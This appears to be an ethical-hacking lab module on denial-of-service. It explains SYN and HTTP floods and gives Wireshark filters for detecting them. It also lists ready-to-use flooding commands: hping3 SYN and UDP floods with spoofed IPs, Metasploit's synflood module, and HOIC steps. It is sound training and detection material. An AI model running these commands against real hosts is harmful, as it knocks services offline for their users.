# 10 - DoS

#### <mark style="color:purple;">**Module 10 - Denial-of-Service**</mark>

<details>

<summary>DOS</summary>

A **Denial of Service** (DoS) attack is a malicious attempt to disrupt the normal functioning of a network, service, website, or computer system by overwhelming it with an excessive amount of traffic, requests, or other forms of malicious activity. The primary goal of a DoS attack is to make the target system or network unavailable to its intended users.

Here are some key characteristics of a Denial of Service attack:

1. **Overload**: Attackers flood the target with a massive volume of traffic, which can be in the form of network requests, data packets, or other resource-consuming actions. The target system becomes overwhelmed and is unable to handle the volume of incoming requests.
2. **Resource Depletion**: DoS attacks may aim to exhaust system resources such as bandwidth, processing power, memory, or network connections. This can result in the target system slowing down or becoming completely unavailable.
3. **Temporary Disruption**: DoS attacks typically result in a temporary disruption of services. Once the attack ceases, the affected system can often recover and resume normal operation.
4. **Distributed DoS (DDoS)**: In more advanced attacks, multiple compromised computers or devices are used to launch a Distributed Denial of Service (DDoS) attack. This makes it much more challenging to mitigate the attack because it comes from multiple sources simultaneously.
5. **Motivation**: DoS attacks can be carried out for various reasons, including financial gain, ideological reasons, revenge, or simply for the thrill of causing disruption.
6. **Legality**: DoS attacks are illegal in many jurisdictions and can result in criminal charges if the attackers are identified and apprehended.

</details>

<details>

<summary>SYN Flooding</summary>

**SYN flooding** is a type of cyberattack that targets a server by overwhelming it with a flood of fake or incomplete connection requests (SYN packets). These requests are part of the 3-way handshake process used to establish a connection between a client and a server. In a SYN flood attack, the attacker sends a large number of SYN packets without completing the handshake, tying up the server's resources and preventing it from servicing legitimate connections.

This can lead to a denial of service (DoS) or distributed denial of service (DDoS) attack, causing the server to become unresponsive. Mitigation strategies include rate limiting, SYN cookies, and deploying intrusion detection and prevention systems.

</details>

## **SYN Flooding**

### **Perform a SYN Flooding on a Target Host using hping3**

**Target:**

* Wireshark-\&gt;Ethernet

#### **Attacker**

* **hping3 -S \<Target IP> -a \<Spoofable IP> -p \<Port to flood> -flood**
  * **-S: Set the SYN flag**
  * **-a: Spoof the IP address**
  * **-p: Specify the destination port, e.g 22**
  * **--flood: Send a huge number of packets**

#### **Target**

* Check Wireshark

#### **Attacker (Perform PoD)**

* **hping3 -d 65538 -S -p 21 –flood \<Target IP>**
  * **-d: Specify data size**
  * **-S: Set the SYN flag**

#### **Attacker (Perform UDP application layer flood attack)**

* nmap -p 139 10.10.10.19 (check service)
* **hping3 -2 -p 139 –flood \<Target IP>**
  * **-2: Specify UDP mode**

### **SYN Flooding using Metasploit**

```bash
nmap -p 21 10.10.10.10 #check open ports or specific port

msfconsole -q #start msfconsole
use auxiliary/dos/tcp/synflood #SYN Flooding module
set RHOST <Target IP>
set RPORT 21
set SHOST <Spoofed IP Address> #Our fake IP 
set TIMEOUT 20000 and press Enter

#open Wireshark and View Flood attack on victim via Wireshark, use filter:
tcp.port=21
```

## HTTP Flooding Attack



<details>

<summary><strong>HTTP flood attack</strong></summary>

**HTTP flood attack**, is a type of cyberattack aimed at overwhelming a web server by sending a massive volume of HTTP requests. These requests often mimic legitimate user interactions with a website, such as GET or POST requests for web pages or resources. The intent is to consume the server's resources, exhaust its processing capacity, and cause it to become slow or unresponsive, resulting in a denial of service (DoS) situation.

Attackers may employ botnets or distributed networks of compromised devices to intensify the attack. Defenses against HTTP flooding include rate limiting, traffic analysis, and content delivery networks (CDNs) to absorb excess traffic and protect the target server.

</details>

### HTTP Flooding Attack using HOIC (High Orbit Ion Cannon)

* Open HOIC.
* Set threads = 20
* Click + to add target
* Enter Target http://\<Target IP> -> Power = High -> Booster = GenericBoost.hoic
* Click **FIRE TEH LAZER!** to launch attack

## Detecting DoS Attack traffic <a href="#user-content-detecting-dos-attack-traffic" id="user-content-detecting-dos-attack-traffic"></a>

KFSensor Free Trial: [http://www.keyfocus.net/kfsensor/](http://www.keyfocus.net/kfsensor/)\
Wireshark: [https://www.wireshark.org/](https://www.wireshark.org/)

**To find DOS (SYN and ACK) :**&#x20;

`tcp.flags.syn == 1 , tcp.flags.syn == 1 and tcp.flags.ack == 0`

**To find passwords :**&#x20;

`http.request.method == POST`

To find DOS -> Look for Red and Black packets with around 1-2 simple packets in between and then pick any packet and check the Source and Destination IP with port if need.

#### To determine the number of machines that were involved in DDOS attack

* statistic -> IPv4 statistic -> source and destination address&#x20;

Or

* View Flood attack on victim via Wireshark | use filter tcp.port=21

Or&#x20;

Find the dos attacker ip using Wireshark

Statistic -> conversion

identified ip , which has flooding server with SYN request.

Or&#x20;

get the statistics of ipv4 -> we can see that Packets B -> A are null, because the're not reply pack.

{% embed url="https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/9-Denial-of-Service/3-Detecting-DoS-Traffic.md" %}

{% content-ref url="../tools/wireshark-or-tcpdump.md" %}
[wireshark-or-tcpdump.md](../tools/wireshark-or-tcpdump.md)
{% endcontent-ref %}

#### **Other UDP-based applications and their ports**

* CharGen UDP Port 19
* SNMPv2 UDP Port 161
* QOTD UDP Port 17
* RPC UDP Port 135
* SSDP UDP Port 1900
* CLDAP UDP Port 389
* TFTP UDP Port 69
* NetBIOS UDP Port 137,138,139
* NTP UDP Port 123
* Quake Network Protocol UDP Port 26000
* VoIP UDP Port 5060
